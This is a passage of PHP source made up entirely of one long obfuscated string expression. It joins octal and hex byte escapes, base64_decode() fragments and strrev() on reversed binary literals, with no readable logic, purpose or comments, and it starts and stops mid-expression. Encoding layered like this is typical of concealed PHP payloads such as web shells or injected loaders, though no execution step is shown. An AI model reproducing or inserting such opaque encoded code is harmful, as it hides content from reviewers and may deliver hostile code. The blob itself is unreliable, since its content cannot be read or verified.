144\323\224\343\275\20".base64_decode('a/DmG36lvJpJqRmloKx3OKvqikH7KrV1REgjoHXF2anLPWm5XsrmYmBmyP4s').base64_decode('koZLk6mpl+Iw6pDSOcN06gpAPyo46Mji+ZLODrieqpJwhgGWJsmTq2olAEYS')."\315\303\251\355\221\110\147\324\327\12\16\343\200\67\332\341\211\64\267\223\156\233\162\17\355\263\37\340\136\326\44\115\134\350\4\133\16\2\132\0\214\225\47\166\152"."\x43\x8a\xe\x3e\xdc\x94\xaf\x97\xfa\xb5\x44\x4c\x1b\x76\xd1\x2c\x58\x38\xc\xb0\x4\x2d\xc\x97\x3b\x6b\x3a\x43\x72\xa6\x7\xce\x4f\x2c\x6f\x2a\x4\x1c\x8d\xc1\x1e\xeb\x44\xfb\x95".base64_decode('TI/ZSyuGvaH53lA0HGyNLPCEyDGeAVAyTD8Fm045Q0oCTH3cpPXkLJw1WgZu')."\x14\xb8\x56\x34\x17\x6e\x1e\x9a\xe7\xf7\xb5\xc1\x89\x69\x71\x1a\xa0\x90\x53\x2c\x45\xdb\xf6\xab\x69\x15\xf6\xdd\x64\x39\x68\x26\xc1\x19\xdf\x46\x3a\xe4\x46\x3\x6a\xe8\xee\xad\x28"."\xeb\x4e\x54\x96\x3b\xc1\xbf\x15\xe5\x4b\xba\x5b\x5c\x15\x4b\x1b\xdd\x2a\xaf\xe3\xae\x76\x55\x4b\x35\x55\x53\xa4\x4e\x40\x74\xa8\x72\x4a\x22\x83\x2e\x28\x51\x25\x5\xe7\xfe\xca\x4".base64_decode('wDNJ2Oa2qcOJIe+8Lm84Eu3wRtqDLeQLXg8J+TW8NemIluCfpS6OrcGa+9Jy').base64_decode('j+ID5ApPhbEOTVesKfxcWKAm6JEBo+2K2tNLxqfC1uJaStPlFMRqFIgVill6')."\324\44\131\37\214\100\171\44\254\246\263\24\317\231\275\271\164\114\10\272\171\127\310\167\301\312\63\354\246\261\243\114\323\111\250\336\115\252\114\252\151\245\70\333\35"."\236\14\376\347\10\72\241\245\145\112\320\42\344\244\44\60\166\302\111\25\226\234\166\105\346\147\243\251\233\32\114\325\55\105\72\24\263\127\43\313\325\243\320\56\345"."\130\337\150\57\23\112\112\241\363\322\253\120\144\17\250\264\101\66\135\200\24\3\141\216\300\125\43\4\12\102\322\210\306\27\100\12\226\47\230\254\150\12\34\53\301".base64_decode('WB/YJ4RIUI1W4VyPaigP9FXm5Tt1JamS3ZYBS9Uh6/20Algafv7AiNBYa5ff')."\x1f\x6d\xe\x6\x22\x80\x2a\xc6\x29\xb\x42\xbe\x88\x97\x2\xa7\xa7\x25\xea\x69\xee\x64\xa7\x29\x5f\x6a\x52\x0\x62\x8a\xc2\x63\x0\xa7\xc\xd6\x8\x47\x10\x3f\xab\x38\x16\xa7\x67"."\x2e\xc4\xd2\x38\xc\xd0\x72\x56\xcb\x18\x8a\x33\x4e\x5a\x4b\x70\x7c\x8e\x4b\xcc\xb0\x21\xf3\x82\x1a\x9c\x16\x1f\x76\xca\xe9\x11\x67\x1a\x4c\x93\x93\x75\xdd\x7a\xd4\x4a\x11\xf1\xc4"."\366\221\145\344\170\33\116\54\140\165\350\31\337\31\14\223\12\215\60\25\20\106\61\105\47\375\350\354\42\131\151\1\204\332\274\44\161\14\75\246\145\102\104\171\26".strrev('Ş˜R)'."\0".'Ô^-‚;Fæ÷ikäåGYëN)Ó‡¶şÒ61ó":ºòÍÎ)„')."\xd5\xd9\xe2\xa1\x8b\x2b\xa6\x37\x5\x23\xed\x96\xd4\x2e\x80\x92\xe6\x7b\xfc\x3e\x7b\x71\xef\x42\x5f\x38\x12\x2e\x9a\x5\xd2\xba\xbc\xb6\x1c\xc0\xdd\x75\x86\xbc\xad\xbe\x85\x2c\xda"."\352\363\372\133\302\321\146\117\163\73\57\23\360\164\220\110\64\11\371\53\303\155\55\37\5\270\65\314\270\264\350\40\344\70\351\144\105\55\54\121\224\22\373\121\16"."\x7\xe0\x9c\x54\x8\xec\x91\xe1\x42\x3e\x17\x8d\x84\x90\xdf\x71\x2d\x47\xa1\x91\xd1\x8b\x69\x8a\x44\xd2\x32\xd9\x56\x32\x3d\x3\xcb\xf0\x4f\xb9\xe4\x9\x4b\x66\x36\xca\xd0\x45\x2c"."\317\202\150\30\64\16\50\103\362\175\211\340\371\202\36\104\141\231\46\45\311\120\166\361\4\117\322\144\130\300\26\7\373\202\347\201\25\360\40\206\32\100\2\132\221"."\x28\xdd\x6b\x6\x60\x45\x3c\xb4\x3b\x49\xce\xcc\x46\x83\x80\xeb\xf7\x40\x56\x38\xba\x20\x14\xc\xb4\x91\xa\x43\xbd\xa\xed\x80\x8f\x4c\x7f\x19\xa5\x9b\x8\x47\x6c\x72\x14\x6\x88"."\x1e\x99\xd3\xaf\x74\xd2\xfb\x34\x3a\x95\x2b\xf0\xcf\x89\xf8\x7\xd0\x7b\xe4\xe3\x4a\x86\xce\x7a\xc\x22\x6f\x86\x18\x28\xbb\x3\x76\x3\x45\xbc\x5a\x8e\x7d\x2d\xa6\x69\x29\xba\x4f"."\xc1\xd1\xcf\xf0\x1\xe3\xa5\xfb\xc\xa\x24\xc3\x14\xf9\x54\xd2\xb3\x8c\x1c\x20\x91\xe0\x5c\x6f\x20\x4a\x21\xb\xc7\x4\x68\xc4\x9\x80\x3b\xd\x86\xc8\x84\x98\x5a\x3f\xe5\x95\x70"."\x66\xc8\x1b\xa6\xbb\x5c\x57\x6\x72\x2a\x9d\x2e\xb7\xab\x92\x40\xb1\x2\xce\x28\xf2\x79\xf7\x49\xdd\x43\x95\x65\x4b\x9c\x95\xae\xa5\x20\x50\x5e\x31\x1b\x47\x49\xac\xdb\x65\x89\x4e"."\x24\xf5\x73\x3a\xab\xd\x29\xa2\x32\xa3\xb1\xbc\xbe\xdb\xdd\xed\x2e\x6b\xac\x5f\xe2\x71\x8e\xc8\xce\x91\x2a\xe7\x74\xe7\xd2\xca\x6e\x57\x79\x25\x49\x58\xba\xbc\xc6\x51\xbb\x12\x16"."\0\5\33\47\54\5\77\15\335\215\223\272\235\47\256\132\66\173\111\367\322\322\372\312\361\335\256\11\335\103\113\53\312\33\351\167\342\71\35\360\201\361\74\353\152"."\xa2\xb2\xc\x74\x9\x50\x4a\xac\x48\x6\xa1\x3c\xa1\x0\xcd\x18\x51\xb3\x3c\x75\xf9\x94\x95\x34\x1d\xac\xa1\xd2\xc3\x6b\x2c\x71\x76\x57\x2e\x6d\x14\xea\x9\x49\xf6\x6f\x1\x2a\x9"."\340\337\136\126\316\343\134\14\107\306\252\302\175\117\340\43\227\211\163\354\11\367\105\114\216\23\74\240\366\144\330\26\2\207\76\343\277\255\4\372\362\111\370\167\45"."\x5d\xc8\x1e\x65\x98\xa2\x86\x4c\x52\xd5\x9\x74\xe6\x32\xea\x0\x95\x2a\x64\x94\x1\x12\xd0\x4c\xa\xdf\x31\xc5\x1c\x52\x28\x78\x80\x74\x4b\x1c\x0\x7\xe5\x10\x41\x96\x10\x4b\x21"."\x7a\x90\x7c\x81\x73\x66\xa\x62\x53\xc8\x28\xb2\x51\x48\x8c\xd\xb1\x58\x42\xc9\x90\x75\xda\x9f\x94\x36\xe2\x72\x56\x9\xb\x23\x8c\x46\x23\x9e\x26\xbf\x37\x4a\x31\xc\xc1\xc4\x34"."\216\260\142\23\223\303\201\241\161\214\112\361\103\234\123\347\210\21\41\73\337\30\110\111\10\61\110\212\256\153\172\75\222\67\32\271\54\244\335\0\323\145\202\271\225".base64_decode('AAcvNcyS8JSTelFxAbIypRwgU82oAXdZd3duiZJYugQAtexMLl0+eWU5Jc7d').base64_decode('3eAPjWBcRnqf5WtpANqMUk6eImKxKMOGsAtMuqHpjCbKWshpUzPlFCsG8yIw').strrev('…š)°ÙE	CoüQsHy:	ŒD˜[†„¤ğHG?L^'."\0".'Ñ.zb…')."\13\213\143\302\171\303\124\322\26\121\242\241\310\172\274\267\65\227\112\231\214\166\117\251\375\244\131\2\361\313\212\225\155\325\364\270\145\335\371\211\327\346\1\264\105"."\104\52\53\45\264\165\105\251\344\13\110\115\301\240\337\353\11\110\360\170\45\307\202\257\305\111\133\130\350\364\21\176\206\5\124\112\62\313\0\345\230\64\325\320\162"."\xe0\xc3\xac\x8c\x85\x50\x35\x65\x1d\x9c\xab\x9c\xba\x84\x74\xa0\x20\x6d\x5\x33\xea\x80\x62\x19\x7\x3c\xf7\x1d\x60\xc\xe\xc8\xd7\x38\x38\x15\xee\xe0\x12\x15\x7\xa3\x81\x1d\x84"."\x34\x76\xf0\xd6\x49\xd0\xd7\xe2\x50\x8d\x16\x44\xe6\xa3\x76\x51\x16\xed\xb3\xd9\xb\xe5\xc\x29\x39\xef\xc0\xfd\xf7\x2b\x83\x4a\xca\x41\x7b\xef\xa0\x83\x72\xd0\x11\x38\x10\x3\xd6".base64_decode('QnrTBeCW9AYFASLrdUAwgTBHW4FBOg2MUXBwJsLRo2u5bCf9khDDnSEJvKcs')."\x21\xa4\x69\xa6\x83\x72\x84\x8e\x42\x66\x11\x76\x87\x87\xe6\x73\x40\xe4\xbd\x67\x47\x3c\x19\x2\x8e\xdb\xfb\x80\x53\x61\x7e\xab\x3c\x28\x2e\x70\xd1\xc5\xce\x58\x1\x83\xb\x8d\xb9"."\x70\x93\x93\x74\x76\xe6\xca\x2e\x2d\xe3\x93\xc8\x3b\x11\x91\x7b\xc2\xc2\xe7\x4d\xb9\x87\x7e\xbb\x48\x2e\xe\x87\x94\x78\x3e\xce\x19\xb6\x16\x81\xeb\xb3\xc6\xd8\xd2\x23\x38\x2c\x6"."\114\305\227\236\1\10\203\265\61\373\357\117\41\233\102\15\3\47\13\260\355\26\272\371\230\202\131\176\52\102\104\25\6\370\131\100\105\64\51\310\61\137\216\234\342"."\xb2\x41\xe8\x69\x28\xad\x24\x21\x85\xa6\x9\xfd\xa7\xa3\xb7\xb4\xb\xa3\x7c\x67\xd2\x21\x4a\xb0\x1\x87\x70\xae\xc0\xd5\x71\xf2\x25\x16\xa2\xe4\x47\xd5\xa2\x78\x5e\xa3\x69\xc6\xea".strrev('ó˜Øö»ÀdAÃŒ¸[Œawe¤Ô›o˜¸åODf¯&jï8I!¶‰²').strrev('Cò),P¨ğ‹²\\Æ(î”çÎ²½’Lj-ÆwA’tç­’ÒwĞª°÷ Ù').base64_decode('x1JH2AeGmWfCGSFobRRHW3YXaWf8aLGouMVUww/mrlgYjTSiFY1CKQkNawi+')."\351\5\15\44\140\44\100\272\120\341\41\345\104\242\66\211\7\210\12\13\26\265\10\107\160\377\74\14\3\2\32\54\5\20\243\356\202\173\245\15\342\67\361\60\342".base64_decode('BxXEqTgsFMraUaEFZRc7/+xI25Zqi/KPWtBPwSGFE6g0rYoAfwIwuC4dIzgX')."\240\216\310\15\230\243\112\70\345\370\56\136\156\40\372\202\40\304\225\266\331\61\1\47\26\223\165\227\16\172\304\73\312\117\6\102\33\345\130\302\122\173\11\334\274"."\x5f\xa3\x64\x3b\xdc\x15\xde\x84\x6a\xc2\x14\x88\xd4\x34\x2a\x83\xe3\x5\x5\x6c\xcf\xd2\x84\x6\xd1\x94\xb8\xa\xd6\x80\x13\x40\x8e\x49\x96\x92\xc5\x10\xba\xab\x2\xe1\x60\x17\x3f"."\x82\xc4\x3\x4c\xbc\x6b\x83\xc5\xf8\xc8\xe1\xdd\x1d\xe\x9\xb7\xd4\x69\x76\x99\x87\x12\x5d\x86\xa9\x65\x79\x8e\x10\xc5\xd9\x42\x16\x6f\x54\x28\xc5\x26\x1f\xf5\x10\x1c\x4\x9\x44"."\46\360\51\104\145\111\135\104\354\143\340\166\245\100\11\101\176\354\153\361\350\72\5\22\74\74\50\131\4\211\142\22\334\307\141\52\20\55\206\230\161\343\336\101\176"."\373\214\233\202\37\166\341\163\312\45\47\22\101\52\351\23\303\205\105\105\301\107\361\206\220\102\0\153\112\210\25\57\356\111\245\370\355\242\75\276\333\52\170\257\212"."\225\304\224\335\126\153\105\64\72\25\373\27\113\143\244\135\253\15\206\370\216\343\267\267\166\312\327\212\174\376\33\125\126\260\3\370\202\26\217\103\374\330\253\146\24".base64_decode('gx1QulFkxBAyd7dMME8QTQHuCySIuJ/JXzhKEI43dFRETcvBHEJtCKBqmX2w')."\65\360\114\266\352\132\332\27\4\240\137\34\36\354\345\24\52\201\102\370\146\130\55\66\120\260\176\360\200\330\135\233\64\233\65\305\117\223\15\77\177\172\305\275\237"."\174\260\351\111\34\275\373\247\353\316\136\373\341\206\33\51\130\44\123\3\46\41\251\210\164\172\305\236\340\337\275\161\230\353\1\255\131\230\327\336\171\162\154\333\205"."\356\17\46\156\271\366\226\267\352\276\177\67\275\353\317\267\65\334\270\176\376\342\317\306\277\65\60\356\210\146\375\376\33\57\335\236\315\177\172\335\350\65\327\246\77"."\370\367\205\45\336\360\265\345\213\357\361\34\160\317\354\143\146\314\76\167\37\337\113\132\170\321\63\367\175\164\301\67\311\366\315\67\274\172\350\103\223\265\315\103\377"."\176\327\373\220\356\274\376\375\241\125\137\276\60\367\213\207\56\351\151\74\265\347\357\251\33\107\176\173\103\154\151\371\306\47\152\156\360\73\257\227\372\117\337\71\376"."\273\325\17\235\226\373\340\261\367\275\167\326\74\273\346\264\305\233\153\153\133\277\332\333\55\375\156\121\154\335\363\27\176\162\176\323\231\153\227\126\136\165\305\345\167"."\55\214\375\162\315\215\123\256\72\142\126\350\102\345\257\327\255\153\130\164\310\161\353\137\376\156\377\313\367\177\362\346\360\317\343\252\366\253\251\173\355\321\211\201\163"."\x8f\x3f\xb3\xeb\xc6\xfd\xde\x5c\xed\x5d\x7f\x7a\x60\x8f\x99\x67\xec\xf9\xd5\xb4\x52\xf5\x8c\xe9\xfb\xdd\x7c\xc3\xb6\x33\xd3\x87\x2f\x1b\x7f\xc3\x1a\xf9\xaf\x87\x8c\xad\x5f\x73\xc3"."\x86\x33\x5f\xbf\x5b\xbb\xbc\x22\x70\x44\xea\xd3\x8e\x1\xfd\xb0\xfd\xf7\x7e\x61\xb3\x7a\xf3\x81\xd5\xbb\xe\xc\xce\xf8\xf0\xec\x15\xf5\xbb\xaa\xff\xbc\xf4\x95\x97\xbf\xac\xf8\x62"."\334\347\113\277\332\74\174\356\301\63\57\373\327\265\376\103\202\312\61\277\331\70\376\0\371\213\155\223\166\214\53\33\172\371\271\206\37\77\136\372\303\147\307\335\277"."\367\252\275\66\106\274\375\265\163\106\306\156\170\143\354\311\47\275\66\147\354\161\276\203\132\137\276\63\123\177\347\110\155\357\237\36\33\336\153\153\172\322\352\167\337"."\xfb\xc3\xda\xef\x7f\x5c\xfd\x8f\x64\x34\x70\x71\xcd\xd6\x49\x47\xf5\x2f\xf1\x8e\xf8\xde\xe8\xab\x1b\xce\x9d\xea\xee\xdb\x7a\xfe\x98\x39\xd7\x8d\xa9\x1f\x7f\xc0\xdc\xae\x31\x63\xf"."\x1a\xfb\xde\x67\xc6\xd8\x25\xf7\xea\xb7\x5e\x7b\xe4\x6d\xd9\xbe\x55\x9f\xf7\xff\xe6\xd6\x13\x5f\x3b\xf7\xe8\xe1\xa5\x67\x9e\xb1\xa8\xb2\xe2\x8f\x17\x6d\x7e\xb4\x61\x38\xe9\xfa\xf8"."\367\135\27\216\311\265\236\55\135\22\375\303\360\345\245\231\175\16\154\334\133\71\47\275\244\162\227\367\364\117\346\364\75\342\55\53\171\352\272\215\261\23\56\171\170"."\xf6\xe2\x85\xaf\x8f\xbb\xe4\xca\x91\x49\x6b\x77\xcc\xfc\xe9\xe3\x2b\x57\xbd\x54\xe7\x94\xe3\xa9\x17\x5f\x38\x77\xf1\xbd\x9d\xb\xe\x7d\xe8\xd5\x59\x77\xbd\x34\x6e\xf9\x81\x9f\xe6".base64_decode('bx+3fY/NU77a1dR00P7lT+z10dV/3vvA+pN+2nPLftWfvHfZ0Xt8+tTcp55+')."\362\343\374\61\77\275\347\74\370\311\305\317\76\272\353\366\111\57\335\364\343\206\125\37\314\153\277\55\173\346\271\53\116\366\315\114\37\271\370\316\47\236\14\374\166".base64_decode('fk35lyNf7rqo6Tlv+J3SPy+Yfva2aQecdeX54xrqJqcHnHd/vGrZavPIxyID')."\335\312\323\367\234\330\177\331\362\13\223\127\276\360\370\243\335\133\313\163\343\207\132\332\57\370\355\261\303\107\37\322\375\376\305\373\176\375\345\351\307\276\177\223\167"."\xc2\xcb\xa7\x6f\xfe\xe3\xc1\x81\x97\x6a\x4f\x34\x6e\xdd\x3b\xfe\x3f\xaf\xd6\xae\x7a\xf5\xb1\x67\xc3\x7d\xdf\xb9\xee\xaa\xcd\xcc\x96\xea\x96\x4e\xf5\x98\x73\x6\xf\xfa\xcd\xfd\x73"."\x67\xee\x5a\x59\x55\x3a\xf7\xa9\x92\xf6\xe5\x89\xad\x2b\x5f\x99\x32\xf9\x77\xe3\xe4\xdc\xa6\xc5\x6a\xe0\x95\xed\x97\xae\x39\xec\xfb\xcc\x6a\x47\xf9\x59\xd9\xff\x31\x93\x8b\x9e\xb9"."\160\276\157\377\337\157\272\371\306\303\152\177\374\327\276\73\366\171\356\230\57\76\177\63\163\347\317\233\373\277\273\376\267\217\234\175\353\343\207\237\327\272\246\364\312".base64_decode('byacOnb9tK3T1+SO3eemycftfWzuyMWXvz2+okp77tiv8lVT4l3Bpw+cceXE')."\xb6\x97\x62\x8f\xde\x29\x7f\x7a\xc7\xa6\x23\xf\x39\xbd\x62\xf9\x25\x7b\xbd\x31\x7a\xac\x57\xbf\xe6\xe8\xd3\xdb\xea\x17\xd\xbf\x36\xfa\xcc\x79\xb3\xcf\x6f\x1e\xa8\x6d\xff\xea\xf1"."\xc3\x3b\x2a\xfa\x1e\xbf\xf0\xa7\x33\x9e\xff\xe7\x15\xc7\xef\x13\xbe\xf2\x18\xe3\xbe\xe9\x9f\xdf\xbb\xfd\xe2\xd1\x44\xe3\xa6\xe3\x33\x93\xcf\x9a\xf1\xe6\x37\x1f\x57\x1e\xd7\xf3\xd8"."\xe8\x98\xaf\x7\xee\x75\xc4\xdb\xc6\x6\x3a\xae\xb9\xe9\xc1\x91\xf3\x3\x35\x6d\x87\xef\x3d\x65\xf2\x3f\x57\x6e\x3f\xc6\x7d\x68\xc9\xed\xab\xe7\x96\xb4\x5d\xac\x6e\xb8\x6e\xf4\xd0"."\61\362\336\315\307\276\372\347\47\66\336\276\161\353\215\353\237\171\147\111\335\373\25\331\115\127\5\376\175\330\272\132\117\300\177\114\317\157\365\331\345\372\36\127\135"."\271\152\373\173\217\232\77\335\62\344\230\372\323\177\36\333\373\201\251\313\356\331\357\352\245\371\332\243\375\123\46\74\270\146\332\237\16\163\176\166\312\1\117\145\332"."\327\66\165\274\62\347\257\373\126\70\46\46\307\347\66\272\316\352\77\270\155\237\313\73\77\75\173\341\325\331\23\316\32\263\141\166\373\137\274\57\264\377\345\273\165"."\x97\x5f\x7b\x4a\x78\xf5\xed\xc7\xbc\xb6\xf5\xc6\xd7\x1f\xf8\xea\x85\x95\x23\x8e\x74\xc7\x98\x23\xd7\xdc\x3e\x6d\xc1\x96\x8e\xab\x1e\x9a\xf3\x4e\xdd\xa6\xa1\xf3\xa4\x13\xc6\xfe\xfe"."\374\165\23\226\224\16\154\133\160\313\1\316\375\246\36\373\352\343\237\37\165\351\55\237\354\333\376\360\307\327\36\63\66\367\340\47\307\314\77\50\366\141\331\157\336"."\271\63\365\341\36\307\175\220\73\75\371\313\362\55\23\17\373\317\32\145\347\117\227\375\175\352\271\143\337\132\133\62\343\352\127\57\377\372\157\231\135\362\165\65\333".base64_decode('Hzw31uy8vsT1deWaM1+ucrRdOud3GfnFCe8+m13Z+7X0/taza82/9Wh7zRnz').strrev('áéú=}¼õzÛŸ··_Ïúƒ†üó¾¾Súò{ÎO¬Ég‹ù¿/Ç§õÃ')."\xb3\x5f\x9a\x71\x7c\xf0\x96\x6b\x9e\xde\xf4\x9f\xd1\xaf\x6\x6e\x3e\xe4\xbd\x23\xde\xd5\xe\x5b\xfc\xed\x71\xd7\x2d\x3a\xed\x8e\xcb\x2e\x5c\xf5\xcb\x6b\xa1\x79\xf7\xb6\xff\x36\xf5".strrev('?#•rgîâ{÷;^ïbê‰ºÖ¬ı{ÍÖG;úÏx§[úÁ÷<Ìm×-ÆmÌÅ')."\77\367\323\377\174\364\261\363\344\175\113\357\353\175\275\345\373\120\367\325\207\36\277\356\336\303\127\156\215\274\256\375\217\374\315\117\167\154\134\174\353\302\315\51\355".base64_decode('s3fe3fp871GvjL2wc9Gt68c9YW7vf2VJ+IUb3388e5P7qdfub//7nV/9cMeG').base64_decode('mb98+OId1/z87Y9vPbjg5FXfv72u8YFV33367Sc90ZNW/bju2e9n5X9+K7p5')."\326\312\221\157\177\212\246\76\335\333\170\344\211\167\127\376\364\324\71\103\337\227\146\353\316\277\141\321\136\247\237\27\70\372\326\223\37\272\354\261\212\175\326\76\264"."\172\357\135\343\377\24\330\247\154\213\234\17\144\357\152\315\165\157\372\335\335\173\266\256\335\65\375\244\307\277\334\130\121\321\263\307\131\307\57\53\251\272\345\243\130"."\x6b\xca\x1d\xa9\x38\x67\x71\xeb\x6f\x3e\x6e\xbd\xb8\xfc\x77\xa1\x9e\x79\x2d\xef\x9c\x73\x82\x5a\xba\xe5\xef\xef\x5d\x76\x69\xd3\xbe\x5f\x3d\x77\xc0\x55\xce\xb\xde\xea\x3b\x3c\x74".base64_decode('6gXf7nHoX+YccfnngWB+1ZGP1d46u/ft1eP3fPeNf/6w5IE3tgwe/8U7b116')."\214\264\356\244\212\243\116\320\76\113\235\160\274\371\324\147\147\154\276\332\175\367\320\17\133\334\307\224\335\72\345\357\107\77\370\316\53\45\67\216\116\175\145\225\74".base64_decode('4fq7b3JJXx94x1FPj3nAePlP+/98Ue/YQ2M/bFqoLfv91Irf77l+3Bv9oTtP')."\151\135\270\366\242\171\251\324\101\227\257\65\246\277\171\331\263\137\75\64\367\266\355\17\65\71\217\72\155\346\115\361\175\77\334\43\377\350\324\373\246\176\275\372\376".strrev('|?¥ıÓz´ÒÜŸ\'Áó4×}Ü=Üó`¶S™è?ìùº¯«¤æü=²kÚ£').base64_decode('7XbzAa1efaP2Pxuu7s7U7/la9dFN1//y8yFzn5L/OZrsuuDWKuX+rd0Xv5p7')."\x7b\xc3\x35\x57\x2f\xbf\xed\xb4\xda\xcf\xcf\x7c\x26\xf4\xed\xf1\x53\x66\xac\xdb\xfa\x8c\x67\x42\xdb\x8c\xbb\xf6\xfb\x30\xfb\xe6\xb8\xcd\x73\x1e\x5c\xbd\xfa\xdc\xc5\x6f\xcd\x1f\xfd"."\326\167\362\113\343\6\47\335\321\177\365\234\307\126\237\271\346\252\206\350\346\321\33\36\176\241\145\160\306\77\266\254\61\276\331\270\375\330\117\27\174\327\72\122\65".base64_decode('7utL3n+hcv05829ddtZF3y4Y2nLfuM82n1LbuuXYSdGHxiTWvzBt5nnSHkv+').strrev('Oãg/2ë{íûÕü–ïùX›/÷¶{é¨åA–ú¹\\Î—Ok›Ùu/¯Ë÷½¶').base64_decode('L3n+nYa2A7bftuHjr59tKnWp90V/+v2ER8+d98URdfmeyG3/nn+osSt8y71X')."\174\166\372\225\147\173\326\356\51\77\165\327\353\55\157\170\277\375\323\215\45\43\155\117\177\370\374\332\317\276\230\367\314\105\161\351\340\331\207\134\264\330\263\277\374"."\xd8\xdf\x2e\x78\xdb\x9f\x7f\xfc\xf0\x2b\x2b\x5f\x51\xcf\x98\xb9\x4b\xbd\x67\x7e\x47\x72\xa3\x12\x1a\x78\xfb\x9e\xf1\xab\xff\xb1\xb9\xb1\xbd\xfa\xb1\xa3\xc7\x4d\xbb\xf4\x5f\xcf\x7c"."\x55\xdf\xfe\x7b\xef\x29\x3\x3d\x8f\x7e\x73\xc4\xa6\xa5\xcb\x33\x9f\x4e\x7e\xf8\xd6\x9\xb3\x8e\x7e\xe8\xcd\x75\x1f\x8e\xbd\x63\xca\xc0\x3f\xd7\x3c\xff\xe1\xda\xd9\xb3\xc6\x3c\x7b"."\xcf\xba\xa7\x3c\x4f\x3e\x7f\xc1\xea\xdb\xef\xd5\x7e\xcc\x8f\xd9\xa3\xf4\xb3\x9\xd5\xc9\xae\x79\xe9\xa7\xfe\x38\xf1\x98\x9b\x1a\x57\x4c\xfc\xf9\xed\xa6\xda\x9a\x53\xc6\xe\x5f\x52"."\x31\xe7\x98\xaf\x1a\xd6\xbb\xfd\x2f\x4b\xbd\x75\x7f\xfc\xdb\xfc\xdb\x2\xd7\xfa\xf6\x7b\x78\xc7\x95\xcb\xff\xf6\x44\x55\xef\xcc\x31\x7f\x39\x42\x1f\xdc\x32\x63\x65\x58\xaf\xbc\x25"."\xf1\xfa\xb\x7\x1f\x7c\x45\xa9\xd1\xff\x96\xa4\xf7\xbc\x74\xf5\x83\x77\xdf\xf5\xba\xea\xac\x3a\xe1\xf5\x7b\xce\x7c\x61\xc3\xb6\xad\x7b\x4c\x7c\xea\x4e\xd7\xfa\xef\xf\x79\xfb\x1f"."\255\53\227\357\374\52\336\376\335\376\177\120\46\325\72\73\66\234\371\346\22\355\224\267\276\167\36\26\364\257\164\76\70\155\375\254\151\343\273\326\116\315\167\56\173"."\x64\xd9\xed\x87\xfb\x83\x6f\x6\xbd\xcf\x2c\xbb\xe7\xd1\x9d\x13\xb6\x1d\xf8\xcd\xc0\xbe\x3b\x9a\x57\x8d\x69\xfa\xe5\xd0\x73\xce\x93\x7d\xfb\x94\x48\xa7\x34\x1f\x72\xdd\xda\xca\x73"."\276\177\157\302\253\167\236\30\370\362\301\135\247\215\335\166\337\170\307\211\312\204\276\167\116\116\374\271\47\170\377\121\133\132\362\27\376\163\332\221\261\207\126\74\362"."\xe3\xbf\xbe\x78\xf1\x9a\x15\x3f\xfc\xfb\xbe\x6b\xa2\x27\x7f\xf5\xec\xb3\xdf\x3f\xb2\xed\xdf\x2f\x6a\xae\xc6\x7f\x7d\xb9\x6b\x75\xe9\x8b\xbf\x7c\xf9\xa2\xd6\xf8\xc3\x47\x5f\xff\xf5".base64_decode('qHlrjf98/tSCX3488cefRoMLgo0P//jRw89Gf/n86798f8e2n9/+9pHGn75Y')."\x70\xcd\x9f\x36\xee\x77\xce\x71\x33\x2e\xb8\xe1\xd2\xb\x3a\xde\xbd\xf6\xb5\xf\xcf\x7a\xf2\xd2\xdc\x86\xd2\x6d\x4b\xbe\xcf\x3c\xbc\xd7\xa5\x37\x7d\x26\xdf\x74\x71\x7e\xc7\x41\xae"."\323\46\335\235\66\356\173\355\163\363\373\357\226\357\167\346\177\156\370\360\261\277\146\153\67\134\265\241\141\370\137\243\23\156\274\145\334\353\67\237\221\237\365\247\324"."\x99\xf7\x1b\x2f\x1e\xf2\xe7\x27\xf4\x7b\xb7\x5d\x30\xe6\x89\xd0\x3\xa1\x4d\xaf\x1d\xf3\xc0\xf2\xc6\x7d\x36\x9d\xfa\x8f\xf1\x37\x35\x9f\x78\x54\xea\x6f\xef\x55\x6c\xbb\xe8\x9c\xc0".strrev('·gÙõ¿_ûO¼ëåh÷Ï0ÿçÚå8Ù­®7ó	ãh¸ŸW=M•¥Ôä”Ëxùk¿')."\x9c\x75\xb8\xf4\x40\xe5\xac\x97\x9f\xcb\xf7\x85\xfd\x2f\x6c\xbf\x70\xd7\xa6\xfc\xf6\x8e\xdb\xd6\x56\x7f\xd9\x78\xff\x9\x93\x8f\xdd\x7c\x14\xd5\x1e\xaf\x9e\x42\x94\x13\x88\x12\x6c"."\52\67\330\333\67\102\25\103\173\62\275\261\21\42\122\251\253\305\277\231\76\65\221\246\4\74\251\234\355\313\47\145\172\173\66\255\166\72\341\164\122\175\103\146\77"."\xb9\x43\x91\xfb\xcd\x8c\x92\xea\xc3\x91\xa9\xa4\x1e\x69\x32\xad\x24\x65\x63\x88\x90\xc5\x46\x5c\x19\xd4\x87\x48\xc1\x29\xd3\x48\xbf\x62\x83\xf9\xbe\xde\x21\x22\xaf\xa8\xa9\x9d\x4a"."\332\251\45\104\164\156\310\114\364\33\244\333\325\65\244\3\325\123\151\240\212\110\100\246\117\45\25\222\106\72\326\223\243\227\374\231\224\32\37\41\254\20\274\124\32".base64_decode('7Cd8SDrfEx+gUrCBnJGJUeq9dhppaSCvGbE+8mmi/TJ5MsnUzFiqVyczWFtN')."\306\133\133\67\205\364\213\364\57\221\125\225\214\106\64\254\106\124\43\337\227\246\362\312\41\335\30\240\367\161\323\247\223\366\153\351\60\344\334\110\334\314\23\171\137"."\56\155\16\144\22\244\177\65\223\311\220\23\106\237\256\366\217\220\216\125\223\231\117\244\107\122\31\223\254\242\326\333\77\224\110\221\317\117\247\163\125\107\46\131\311".strrev('Ö§a:*I×t6ı -TÓ¦–’HÆTÍd¾’×VTÜ™=Y'."\r".'rñƒÈ')."\x91\xd4\xc9\xd3\xaa\x68\x9f\x27\xd3\xf5\xaa\xa3\x80\x52\x43\x5\x21\xca\x50\xae\x97\x7c\xa5\x6e\x1a\x99\xc8\xec\xd0\x88\x99\x1f\x26\x1c\x7d\x5e\x97\x63\x7d\x3\x44\x70\x5a\x4b\x3b"."\122\75\225\224\235\122\107\46\173\130\33\34\112\366\221\151\232\66\231\202\22\135\262\341\376\344\140\72\246\322\76\22\240\354\33\212\247\262\303\264\233\164\365\110\277"."\153\153\310\172\326\114\45\137\255\253\43\145\144\45\71\20\357\241\327\205\111\55\257\233\104\101\156\112\365\64\272\230\244\122\52\231\311\245\373\173\51\344\223\66\353".strrev('	“)ì{‘®ŸD¹òå¥Oá“\'Ó©#]£FzcûeNÉm6z@ë¦U!©½sûHj')."\74\344\142\375\11\171\44\116\347\254\216\2\34\311\6\363\232\320\223\124\230\220\214\3\64\101\327\226\216\264\246\232\55\47\375\166\65\135\127\226\203\177\7\315\336".strrev('ß´vİraipìõúÔZG]Q